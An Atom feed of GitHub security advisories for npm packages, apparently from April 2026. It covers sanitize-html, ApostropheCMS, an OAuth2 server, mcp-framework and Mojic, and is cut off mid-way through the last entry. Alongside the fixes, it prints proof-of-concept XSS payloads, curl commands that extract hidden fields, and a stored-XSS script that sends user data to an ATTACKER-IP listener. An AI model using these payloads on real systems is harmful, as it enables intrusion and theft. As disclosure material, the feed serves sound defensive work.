<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-04-16T21:12:48.913Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mojic] Mojic: Observable Timing Discrepancy in HMAC Verification]]></title>
        <id>https://github.com/advisories/GHSA-wqq3-wfmp-v85g</id>
        <link href="https://github.com/advisories/GHSA-wqq3-wfmp-v85g"/>
        <updated>2026-04-16T21:10:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>CipherEngine</code> in Mojic v2.1.3 uses a standard equality operator (<code>!==</code>) to verify the HMAC-SHA256 integrity seal during the decryption phase. This creates an Observable Timing Discrepancy (CWE-208), allowing a potential attacker to bypass the file integrity check via a timing attack.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/CipherEngine.js</code>, the footer check validates the HMAC signature using a standard string comparison:
<code>if (footerHex !== calcDigest) { ... }</code></p>
<p>Standard string comparisons in JavaScript short-circuit; they return <code>false</code> the moment a character mismatch occurs. Because the time taken to evaluate the comparison is proportional to the number of matching leading bytes, an attacker can measure the exact microseconds it takes for the engine to throw the <code>FILE_TAMPERED</code> error. By repeatedly altering the signature byte-by-byte and analyzing these minute timing differences, a malicious actor can theoretically forge a valid HMAC signature without possessing the decryption password.</p>
<h3 id="poc">PoC</h3>
<p>The vulnerable implementation is located in <code>lib/CipherEngine.js</code>, within the <code>getDecryptStream()</code> flush method (approximately line 265):</p>
<pre><code class="language-javascript">// Vulnerable Code
if (footerHex !== calcDigest) {
    this.emit('error', new Error("FILE_TAMPERED"));
    return;
}
</code></pre>
<h3 id="recommended-remediation">Recommended Remediation:</h3>
<p>Replace the standard equality operator with Node.js's built-in constant-time comparison utility, crypto.timingSafeEqual().</p>
<pre><code class="language-JavaScript">// Remediated Code
const footerBuffer = Buffer.from(footerHex, 'hex');
const calcBuffer = Buffer.from(calcDigest, 'hex');

if (footerBuffer.length !== calcBuffer.length || !crypto.timingSafeEqual(footerBuffer, calcBuffer)) {
    this.emit('error', new Error("FILE_TAMPERED"));
    return;
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If successfully exploited, an attacker could tamper with the encrypted .mojic payload and forge a valid HMAC signature. This bypasses the integrity seal, tricking the decryption engine into processing maliciously injected emoji streams. Because the engine translates these emojis back into C keywords and raw data chunks, this could ultimately result in arbitrary Code Injection into the restored .c source code when an unsuspecting user decrypts the tampered file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/notamitgamer/mojic/security/advisories/GHSA-wqq3-wfmp-v85g">https://github.com/notamitgamer/mojic/security/advisories/GHSA-wqq3-wfmp-v85g</a></li>
<li><a href="https://github.com/advisories/GHSA-wqq3-wfmp-v85g">https://github.com/advisories/GHSA-wqq3-wfmp-v85g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wqq3-wfmp-v85g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T21:10:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@node-oauth/oauth2-server] @node-oauth/oauth2-server: PKCE code_verifier ABNF not enforced in token exchange allows brute-force redemption of intercepted authorization codes]]></title>
        <id>https://github.com/advisories/GHSA-jhm7-29pj-4xvf</id>
        <link href="https://github.com/advisories/GHSA-jhm7-29pj-4xvf"/>
        <updated>2026-04-16T21:09:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The token exchange path accepts RFC7636-invalid <code>code_verifier</code> values (including one-character strings) for <code>S256</code> PKCE flows.<br>Because short/weak verifiers are accepted and failed verifier attempts do not consume the authorization code, an attacker who intercepts an authorization code can brute-force <code>code_verifier</code> guesses online until token issuance succeeds.</p>
<h3 id="root-cause">Root cause</h3>
<ol>
<li><code>lib/pkce/pkce.js</code> (<code>getHashForCodeChallenge</code>) only checks that <code>verifier</code> is a non-empty string before hashing for <code>S256</code>; it does not enforce RFC7636 ABNF (<code>43..128</code> unreserved chars).</li>
<li><code>lib/grant-types/authorization-code-grant-type.js</code> compares <code>hash(code_verifier)</code> to stored <code>codeChallenge</code> without validating verifier format/length.</li>
<li>In <code>AuthorizationCodeGrantType.handle</code>, authorization code revocation happens <strong>after</strong> verifier validation. Invalid guesses fail before revoke, so the same code can be retried repeatedly.</li>
</ol>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<h3 id="setup">Setup</h3>
<ul>
<li>PKCE authorization code exists with:<ul>
<li><code>codeChallengeMethod = "S256"</code></li>
<li><code>codeChallenge = BASE64URL(SHA256("z"))</code> (verifier is one character, RFC-invalid)</li>
</ul>
</li>
<li>Attacker has intercepted the authorization code value.</li>
</ul>
<h3 id="reproduction">Reproduction</h3>
<ol>
<li>Send repeated token requests with guessed <code>code_verifier</code> values:</li>
</ol>
<pre><code class="language-http">POST /token HTTP/1.1
Host: oauth.example
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&amp;
client_id=client1&amp;
client_secret=s3cret&amp;
code=stolen-auth-code&amp;
redirect_uri=https://client.example/callback&amp;
code_verifier=&lt;guess&gt;
</code></pre>
<ol start="2">
<li>Observe invalid guesses return <code>invalid_grant</code>.</li>
<li>Continue guessing (<code>a</code>..<code>z</code>).</li>
<li>When <code>code_verifier=z</code>, token issuance succeeds and returns bearer tokens.</li>
</ol>
<h3 id="confirmed-poc-output">Confirmed PoC output</h3>
<pre><code class="language-text">BRUTE_FORCE_SUCCESS { tries: 26, guess: 'z', status: 200, tokenIssued: true }
</code></pre>
<h2 id="impact">Impact</h2>
<p>An intercepted authorization code can be redeemed by brute-forcing low-entropy verifiers that the server should have rejected under RFC7636.<br>This weakens PKCE’s protection goal and allows token theft when clients generate short/predictable verifiers.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<ol>
<li>Enforce <code>pkce.codeChallengeMatchesABNF(request.body.code_verifier)</code> in authorization code token exchange before hashing/comparison.</li>
<li>Reject verifier values outside RFC7636 charset/length (<code>43..128</code> unreserved).</li>
<li>Invalidate authorization codes on failed verifier attempts (or add strict retry limits) to prevent online guessing.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-oauth/node-oauth2-server/security/advisories/GHSA-jhm7-29pj-4xvf">https://github.com/node-oauth/node-oauth2-server/security/advisories/GHSA-jhm7-29pj-4xvf</a></li>
<li><a href="https://github.com/advisories/GHSA-jhm7-29pj-4xvf">https://github.com/advisories/GHSA-jhm7-29pj-4xvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhm7-29pj-4xvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T21:09:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanitize-html] sanitize-html allowedTags Bypass via Entity-Decoded Text in nonTextTags Elements]]></title>
        <id>https://github.com/advisories/GHSA-9mrh-v2v3-xpfm</id>
        <link href="https://github.com/advisories/GHSA-9mrh-v2v3-xpfm"/>
        <updated>2026-04-16T21:08:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Commit 49d0bb7 introduced a regression in sanitize-html that bypasses <code>allowedTags</code> enforcement for text inside <code>nonTextTagsArray</code> elements (<code>textarea</code> and <code>option</code>). Entity-encoded HTML inside these elements passes through the sanitizer as decoded, unescaped HTML, allowing injection of arbitrary tags including XSS payloads. This affects any application using sanitize-html that includes <code>option</code> or <code>textarea</code> in its <code>allowedTags</code> configuration.</p>
<h2 id="details">Details</h2>
<p>The vulnerable code is at <code>packages/sanitize-html/index.js:569-573</code>:</p>
<pre><code class="language-javascript">} else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') &amp;&amp; (nonTextTagsArray.indexOf(tag) !== -1)) {
  // htmlparser2 does not decode entities inside raw text elements like
  // textarea and option. The text is already properly encoded, so pass
  // it through without additional escaping to avoid double-encoding.
  result += text;
}
</code></pre>
<p>The comment is factually incorrect. htmlparser2 10.x <strong>does</strong> decode HTML entities inside both <code>&lt;textarea&gt;</code> and <code>&lt;option&gt;</code> elements before passing text to the <code>ontext</code> callback. This can be verified:</p>
<pre><code class="language-javascript">const htmlparser2 = require('htmlparser2');
const parser = new htmlparser2.Parser({
  ontext(text) { console.log(JSON.stringify(text)); }
});
parser.write('&lt;option&gt;&amp;lt;script&amp;gt;&lt;/option&gt;');
// Outputs: "&lt;", "script", "&gt;"  — entities are decoded
</code></pre>
<p>Because the code assumes the text is "already properly encoded" and skips <code>escapeHtml()</code>, the decoded entities (<code>&lt;</code>, <code>&gt;</code>) are written directly to the output as literal HTML characters. This completely bypasses the <code>allowedTags</code> filter — any tag can be injected inside an allowed <code>option</code> or <code>textarea</code> element using entity encoding.</p>
<p>The execution flow:</p>
<ol>
<li>Attacker submits: <code>&lt;option&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/option&gt;</code></li>
<li>htmlparser2 parses and decodes entities → <code>ontext</code> receives <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
<li>Code at line 569 checks: tag is <code>option</code>, which is in <code>nonTextTagsArray</code> → true</li>
<li>Line 573: <code>result += text</code> — writes decoded text directly without escaping</li>
<li>Output: <code>&lt;option&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/option&gt;</code> — <code>&lt;img&gt;</code> tag injected despite not being in <code>allowedTags</code></li>
</ol>
<p>The <code>script</code> and <code>style</code> tags are handled separately at lines 563-568 (before the vulnerable block), so the effective vulnerability applies to <code>textarea</code> and <code>option</code>, plus any custom elements added to <code>nonTextTags</code> by the user.</p>
<p>Prior to commit 49d0bb7, text in these elements fell through to the <code>escapeHtml</code> branch (line 574-580), which correctly re-encoded the decoded entities.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> Application using sanitize-html 2.17.2 with <code>option</code> or <code>textarea</code> in <code>allowedTags</code>.</p>
<p><strong>Step 1: Basic tag injection via option</strong></p>
<pre><code class="language-javascript">const sanitize = require('sanitize-html');
const output = sanitize(
  '&lt;option&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/option&gt;',
  { allowedTags: ['option'] }
);
console.log(output);
// Expected (safe): &lt;option&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/option&gt;
// Actual (vulnerable): &lt;option&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/option&gt;
</code></pre>
<p><strong>Step 2: Element breakout with XSS event handler</strong></p>
<pre><code class="language-javascript">const output2 = sanitize(
  '&lt;option&gt;&amp;lt;/option&amp;gt;&amp;lt;img src=x onerror=alert(document.cookie)&amp;gt;&lt;/option&gt;',
  { allowedTags: ['option'] }
);
console.log(output2);
// Output: &lt;option&gt;&lt;/option&gt;&lt;img src=x onerror=alert(document.cookie)&gt;&lt;/option&gt;
// The &lt;img&gt; tag escapes the option context and executes the onerror handler
</code></pre>
<p><strong>Step 3: Textarea breakout (also vulnerable)</strong></p>
<pre><code class="language-javascript">const output3 = sanitize(
  '&lt;textarea&gt;&amp;lt;/textarea&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/textarea&gt;',
  { allowedTags: ['textarea'] }
);
console.log(output3);
// Output: &lt;textarea&gt;&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/textarea&gt;
</code></pre>
<p><strong>Step 4: Full select/option context breakout</strong></p>
<pre><code class="language-javascript">const output4 = sanitize(
  '&lt;select&gt;&lt;option&gt;&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/option&gt;&lt;/select&gt;',
  { allowedTags: ['select', 'option'] }
);
console.log(output4);
// Output: &lt;select&gt;&lt;option&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/option&gt;&lt;/select&gt;
// Breaks out of both option and select elements
</code></pre>
<p>All outputs verified against sanitize-html 2.17.2 with htmlparser2 10.x.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Complete <code>allowedTags</code> bypass</strong>: Any HTML tag can be injected through an allowed <code>option</code> or <code>textarea</code> element using entity encoding, defeating the core security guarantee of sanitize-html.</li>
<li><strong>Stored XSS</strong>: Applications that sanitize user-submitted HTML and allow <code>option</code> or <code>textarea</code> tags (common in form builders, CMS platforms, rich text editors) are vulnerable to stored cross-site scripting.</li>
<li><strong>Session hijacking</strong>: Attackers can inject event handlers (<code>onerror</code>, <code>onload</code>, etc.) to steal session cookies or authentication tokens.</li>
<li><strong>Scope</strong>: Affects non-default configurations only — the default <code>allowedTags</code> does not include <code>option</code> or <code>textarea</code>. However, these tags are commonly allowed in applications that handle form-related HTML content.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Remove the vulnerable code block at lines 569-573 entirely. The <code>escapeHtml</code> branch (line 574) correctly handles these elements — htmlparser2 10.x decodes entities, and re-encoding with <code>escapeHtml</code> produces correct HTML output (entities are round-tripped, not double-encoded).</p>
<pre><code class="language-diff">--- a/packages/sanitize-html/index.js
+++ b/packages/sanitize-html/index.js
@@ -566,11 +566,6 @@ function sanitizeHtml(html, options, _recursing) {
         // your concern, don't allow them. The same is essentially true for style tags
         // which have their own collection of XSS vectors.
         result += text;
-      } else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') &amp;&amp; (nonTextTagsArray.indexOf(tag) !== -1)) {
-        // htmlparser2 does not decode entities inside raw text elements like
-        // textarea and option. The text is already properly encoded, so pass
-        // it through without additional escaping to avoid double-encoding.
-        result += text;
       } else if (!addedText) {
         const escaped = escapeHtml(text, false);
         if (options.textFilter) {
</code></pre>
<p>This fix restores the pre-49d0bb7 behavior where all non-script/style text content goes through <code>escapeHtml()</code>, ensuring decoded entities are properly re-encoded before output.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9mrh-v2v3-xpfm">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9mrh-v2v3-xpfm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40186">https://nvd.nist.gov/vuln/detail/CVE-2026-40186</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/7ca2d16237c72718ef7e5c7ae0458e6027ac4f64">https://github.com/apostrophecms/apostrophe/commit/7ca2d16237c72718ef7e5c7ae0458e6027ac4f64</a></li>
<li><a href="https://github.com/advisories/GHSA-9mrh-v2v3-xpfm">https://github.com/advisories/GHSA-9mrh-v2v3-xpfm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mrh-v2v3-xpfm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T21:08:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] ApostropheCMS: Information Disclosure via choices/counts Query Parameters Bypassing publicApiProjection Field Restrictions]]></title>
        <id>https://github.com/advisories/GHSA-c276-fj82-f2pq</id>
        <link href="https://github.com/advisories/GHSA-c276-fj82-f2pq"/>
        <updated>2026-04-16T20:45:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>choices</code> and <code>counts</code> query parameters in the Apostrophe CMS REST API allow unauthenticated users to extract distinct field values for any schema field that has a registered query builder, completely bypassing <code>publicApiProjection</code> restrictions that are intended to limit which fields are exposed publicly. Fields protected by <code>viewPermission</code> are similarly exposed.</p>
<h2 id="details">Details</h2>
<p>When a piece type configures <code>publicApiProjection</code> to enable public API access while restricting visible fields, the restriction is enforced via a MongoDB projection on the main query (piece-type/index.js:1130-1134). However, the <code>choices</code> and <code>counts</code> query builders bypass this protection through a separate code path.</p>
<p>The vulnerable flow:</p>
<ol>
<li><p><code>getRestQuery</code> at piece-type/index.js:1120 calls <code>applyBuildersSafely(req.query)</code> (line 1122), which processes query parameters including <code>choices</code> and <code>counts</code> since both have <code>launder</code> methods (doc-type/index.js:2627-2628 and 2675-2676).</p>
</li>
<li><p>The <code>publicApiProjection</code> is applied afterward (line 1130-1134) as a MongoDB projection on the main query.</p>
</li>
<li><p>During query execution, the <code>choices</code> builder's <code>after</code> handler (doc-type/index.js:2636-2668) iterates over requested field names. The only validation is:</p>
<ul>
<li>The field has a registered builder (<code>_.has(query.builders, filter)</code> at line 2651)</li>
<li>The builder has a <code>launder</code> method (line 2656)</li>
</ul>
<p>All schema field types (string, integer, float, select, boolean, date, slug, relationship) register query builders with <code>launder</code> methods via <code>addQueryBuilder</code> in <code>addFieldTypes.js</code>.</p>
</li>
<li><p><code>toChoices</code> (line 2661) calls the field's <code>choices</code> function, which typically calls <code>sortedDistinct</code> → <code>toDistinct</code>. The <code>toDistinct</code> method (doc-type/index.js:2811) executes <code>db.distinct(property, criteria)</code> — a MongoDB operation that returns all distinct values for the given property matching the criteria. <strong>MongoDB's <code>distinct</code> operation does not respect projections</strong>; it operates directly on the specified field regardless of any projection set on the query.</p>
</li>
<li><p>The results are stored via <code>query.set('choicesResults', choices)</code> (line 2666) and returned directly in the API response at piece-type/index.js:292-296 without any filtering against <code>publicApiProjection</code> or <code>removeForbiddenFields</code>.</p>
</li>
</ol>
<p>The same bypass applies to <code>viewPermission</code>-protected fields: <code>removeForbiddenFields</code> (doc-type/index.js:1585-1611) only processes document results from <code>toArray()</code>, not the separate choices/counts data.</p>
<p>The page REST API has the same issue at page/index.js:371-376.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Prerequisites:
# - An Apostrophe 4.x instance with a piece type configured with publicApiProjection
# - Example: an 'article' piece type with:
#   publicApiProjection: { title: 1, slug: 1, _url: 1 }
#   and additional schema fields like 'status' (select), 'priority' (integer),
#   or 'internalNotes' (string) NOT in the projection

# 1. Verify normal API access only returns projected fields
curl -s 'http://localhost:3000/api/v1/article' | python3 -m json.tool
# Response results contain only: title, slug, _url (as configured)

# 2. Extract distinct values of a non-projected field via choices
curl -s 'http://localhost:3000/api/v1/article?choices=status' | python3 -m json.tool
# Response includes:
# "choices": {"status": [{"value": "draft", "label": "draft"}, {"value": "published", "label": "published"}, ...]}

# 3. Extract distinct values with document counts via counts
curl -s 'http://localhost:3000/api/v1/article?counts=priority' | python3 -m json.tool
# Response includes:
# "counts": {"priority": [{"value": 1, "label": "1", "count": 15}, {"value": 2, "label": "2", "count": 8}, ...]}

# 4. Multiple fields can be extracted at once
curl -s 'http://localhost:3000/api/v1/article?choices=status,priority,internalNotes'
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Distinct field values leaked</strong>: An unauthenticated attacker can extract all distinct values of any schema field on any piece type that has <code>publicApiProjection</code> configured, even when those fields are explicitly excluded from the projection.</li>
<li><strong>Field types affected</strong>: All field types that register query builders: string, slug, integer, float, select, boolean, date, and relationship fields.</li>
<li><strong>Count disclosure</strong>: The <code>counts</code> variant additionally reveals how many documents have each distinct value, providing statistical information about the dataset.</li>
<li><strong>viewPermission bypass</strong>: Fields protected with <code>viewPermission</code> (intended for role-based field access) are also exposed via this path.</li>
<li><strong>Both APIs affected</strong>: The piece-type REST API (piece-type/index.js:292-296) and page REST API (page/index.js:371-376) are both vulnerable.</li>
<li><strong>Real-world impact</strong>: If a CMS stores sensitive data in schema fields (e.g., internal status values, priority levels, internal categories, user-facing content marked as restricted), all distinct values are extractable by any unauthenticated visitor.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>In the <code>choices</code> builder's <code>after</code> handler (doc-type/index.js:2636-2668), add validation to skip fields not permitted by <code>publicApiProjection</code> and <code>viewPermission</code>:</p>
<pre><code class="language-javascript">// doc-type/index.js, in the choices builder's after handler (line 2644 area)
for (const filter of filters) {
  if (!_.has(query.builders, filter)) {
    continue;
  }
  if (!query.builders[filter].launder) {
    continue;
  }

  // NEW: Enforce publicApiProjection restrictions on choices/counts
  const publicApiProjection = query.get('project');
  if (publicApiProjection &amp;&amp; !publicApiProjection[filter]) {
    continue;
  }

  // NEW: Enforce viewPermission field restrictions
  const field = self.schema.find(f =&gt; f.name === filter);
  if (field &amp;&amp; field.viewPermission &amp;&amp;
      !self.apos.permission.can(query.req, field.viewPermission.action, field.viewPermission.type)) {
    continue;
  }

  const _query = baseQuery.clone();
  _query[filter](null);
  choices[filter] = await _query.toChoices(filter, { counts: query.get('counts') });
}
</code></pre>
<p>Additionally, apply the same fix in the page REST API handler (page/index.js) for consistency.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-c276-fj82-f2pq">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-c276-fj82-f2pq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39857">https://nvd.nist.gov/vuln/detail/CVE-2026-39857</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/6c2b548dec2e3f7a82e8e16736603f4cd17525aa">https://github.com/apostrophecms/apostrophe/commit/6c2b548dec2e3f7a82e8e16736603f4cd17525aa</a></li>
<li><a href="https://github.com/advisories/GHSA-c276-fj82-f2pq">https://github.com/advisories/GHSA-c276-fj82-f2pq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c276-fj82-f2pq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T20:45:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-framework] MCP-Framework: Unbounded memory allocation in readRequestBody allows denial of service via HTTP transport]]></title>
        <id>https://github.com/advisories/GHSA-353c-v8x9-v7c3</id>
        <link href="https://github.com/advisories/GHSA-353c-v8x9-v7c3"/>
        <updated>2026-04-16T20:44:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>readRequestBody()</code> function in <code>src/transports/http/server.ts</code> concatenates HTTP request body chunks into a string with no size limit, allowing a remote unauthenticated attacker to crash the server via memory exhaustion with a single large HTTP POST request.</p>
<h3 id="details">Details</h3>
<p><strong>File:</strong> <code>src/transports/http/server.ts</code>, lines 224-240</p>
<pre><code class="language-typescript">private async readRequestBody(req: IncomingMessage): Promise&lt;any&gt; {
    return new Promise((resolve, reject) =&gt; {
      let body = '';
      req.on('data', (chunk) =&gt; {
        body += chunk.toString();   // No size limit
      });
      req.on('end', () =&gt; {
        try {
          const parsed = body ? JSON.parse(body) : null;
          resolve(parsed);
        } catch (error) {
          reject(error);
        }
      });
      req.on('error', reject);
    });
  }
</code></pre>
<p>A <code>maxMessageSize</code> configuration value exists in <code>DEFAULT_HTTP_STREAM_CONFIG</code> (4MB, defined in <code>src/transports/http/types.ts</code> line 124) but is never enforced in <code>readRequestBody()</code>. This creates a false sense of security.</p>
<h3 id="poc">PoC</h3>
<p>Local testing with 50MB POST payloads against the vulnerable <code>readRequestBody()</code> function:</p>
<table>
<thead>
<tr>
<th>Trial</th>
<th>Payload</th>
<th>RSS growth</th>
<th>Time</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>50MB</td>
<td>+197MB</td>
<td>42ms</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>2</td>
<td>50MB</td>
<td>+183MB</td>
<td>46ms</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>3</td>
<td>50MB</td>
<td>+15MB</td>
<td>43ms</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>4</td>
<td>50MB</td>
<td>+14MB</td>
<td>32ms</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>5</td>
<td>50MB</td>
<td>+65MB</td>
<td>38ms</td>
<td>Vulnerable</td>
</tr>
</tbody></table>
<p>Reproducibility: 5/5 (100%)</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Denial of Service:</strong> Any mcp-framework HTTP server can be crashed by a single large POST request to /mcp</li>
<li><strong>No authentication required:</strong> readRequestBody() executes before any auth checks (auth is opt-in, default is no auth)</li>
<li><strong>Dead config:</strong> maxMessageSize exists but is never enforced, giving a false sense of security</li>
<li><strong>Affected:</strong> All applications using mcp-framework HttpStreamTransport (60,000 weekly npm downloads)</li>
</ul>
<p><strong>CWE-770:</strong> Allocation of Resources Without Limits or Throttling
<strong>Suggested CVSS 3.1:</strong> 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Enforce <code>maxMessageSize</code> in <code>readRequestBody()</code>:</p>
<pre><code class="language-typescript">private async readRequestBody(req: IncomingMessage): Promise&lt;any&gt; {
    const maxSize = this._config.maxMessageSize || 4 * 1024 * 1024;
    return new Promise((resolve, reject) =&gt; {
      let body = '';
      let size = 0;
      req.on('data', (chunk) =&gt; {
        size += chunk.length;
        if (size &gt; maxSize) {
          req.destroy();
          reject(new Error('Request body too large'));
          return;
        }
        body += chunk.toString();
      });
      // ...
    });
  }
</code></pre>
<h3 id="disclosure-timeline">Disclosure Timeline</h3>
<p>This report follows coordinated disclosure. I request a 90-day window before public disclosure.</p>
<p><strong>Reporter:</strong> Raza Sharif, CyberSecAI Ltd (<a href="mailto:contact@agentsign.dev">contact@agentsign.dev</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/QuantGeekDev/mcp-framework/security/advisories/GHSA-353c-v8x9-v7c3">https://github.com/QuantGeekDev/mcp-framework/security/advisories/GHSA-353c-v8x9-v7c3</a></li>
<li><a href="https://github.com/QuantGeekDev/mcp-framework/commit/f97d2bb76d6359faf10cd1fc54b4911476b62524">https://github.com/QuantGeekDev/mcp-framework/commit/f97d2bb76d6359faf10cd1fc54b4911476b62524</a></li>
<li><a href="https://github.com/advisories/GHSA-353c-v8x9-v7c3">https://github.com/advisories/GHSA-353c-v8x9-v7c3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-353c-v8x9-v7c3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-16T20:44:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] Stored XSS in SEO Fields Leads to Authenticated API Data Exposure in ApostropheCMS]]></title>
        <id>https://github.com/advisories/GHSA-855c-r2vq-c292</id>
        <link href="https://github.com/advisories/GHSA-855c-r2vq-c292"/>
        <updated>2026-04-16T20:44:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A stored cross-site scripting (XSS) vulnerability exists in SEO-related fields (SEO Title and Meta Description) in ApostropheCMS.</p>
<p>Improper neutralization of user-controlled input in SEO-related fields allows injection of arbitrary JavaScript into HTML contexts, resulting in stored cross-site scripting (XSS). This can be leveraged to perform authenticated API requests and exfiltrate sensitive data, resulting in a compromise of application confidentiality.</p>
<h2 id="affected-version">Affected Version</h2>
<p>ApostropheCMS (tested on version: v4.28.0)</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>User-controlled input in SEO fields is improperly handled and rendered into HTML contexts such as:</p>
<ul>
<li><code>&lt;title&gt;</code></li>
<li><code>&lt;meta&gt;</code> attributes</li>
<li>structured data (JSON-LD)</li>
</ul>
<p>This allows attackers to inject and execute arbitrary JavaScript in the context of authenticated users.</p>
<h2 id="poc-1">PoC 1</h2>
<p><strong>The following payload demonstrates breaking out of HTML context:</strong></p>
<pre><code class="language-javascript">"&gt;&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p>This confirms:</p>
<ul>
<li>Improper output encoding</li>
<li>Ability to escape <code>&lt;title&gt; / &lt;meta&gt;</code> contexts</li>
<li>Arbitrary script execution</li>
</ul>
<h2 id="poc-2">PoC 2</h2>
<p><strong>This PoC demonstrates how the stored XSS can be leveraged to perform authenticated API requests and exfiltrate sensitive data.</strong></p>
<pre><code class="language-javascript">"&gt;&lt;/title&gt;&lt;script&gt;
fetch('/api/v1/@apostrophecms/user', {
  credentials:'include'
})
.then(r=&gt;r.text())
.then(d=&gt;{
  fetch('http://ATTACKER-IP:5656/?data='+btoa(d))
})
&lt;/script&gt;
</code></pre>
<h2 id="video-proof-of-concept">Video Proof of Concept</h2>
<p>Watch the following YouTube video for a full demonstration of the exploit:</p>
<p><strong>PoC Video:</strong> <a href="https://youtu.be/FZuulua_pa8">https://youtu.be/FZuulua_pa8</a></p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Start a local listener: <code>python3 -m http.server 5656</code></li>
<li>Login to ApostropheCMS as an authenticated user</li>
<li>Create or edit a page</li>
<li>Navigate to SEO settings</li>
<li>Insert the payload into the SEO Title field  and  Meta Description</li>
</ol>
<pre><code class="language-javascript">"&gt;&lt;/title&gt;&lt;script&gt;
fetch('/api/v1/@apostrophecms/user',{
  credentials:'include'
})
.then(r=&gt;r.text())
.then(d=&gt;{
  fetch('http://ATTACKER-IP:5656/?data='+btoa(d))
})
&lt;/script&gt;
</code></pre>
<ol start="6">
